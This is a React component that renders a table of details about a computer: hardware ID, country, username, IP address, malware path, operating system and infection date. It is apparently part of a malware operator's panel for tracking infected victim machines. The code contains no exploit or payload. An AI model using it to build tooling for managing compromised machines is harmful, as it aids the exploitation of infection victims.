import React from "react";
import { useTranslation } from "react-i18next";
import { TComputerInfo } from "types";

type Props = {
  item: TComputerInfo;
};

function Table({ item }: Props) {
  const { t } = useTranslation();

  return (
    <div>
      <table className="data-table">
        <tbody>
          <tr>
            <td>
              <strong>{t("hwid")}</strong>
            </td>
            <td>{item.hwid}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("country")}</strong>
            </td>
            <td>{item.country}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("username")}</strong>
            </td>
            <td>{item.username}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("ip")}</strong>
            </td>
            <td>{item.ip}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("malware_path")}</strong>
            </td>
            <td>{item.malware_path}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("os")}</strong>
            </td>
            <td>{item.os}</td>
          </tr>
          <tr>
            <td>
              <strong>{t("infection_date")}</strong>
            </td>
            <td>{item.infection_date}</td>
          </tr>
        </tbody>
      </table>
    </div>
  );
}

export default Table;
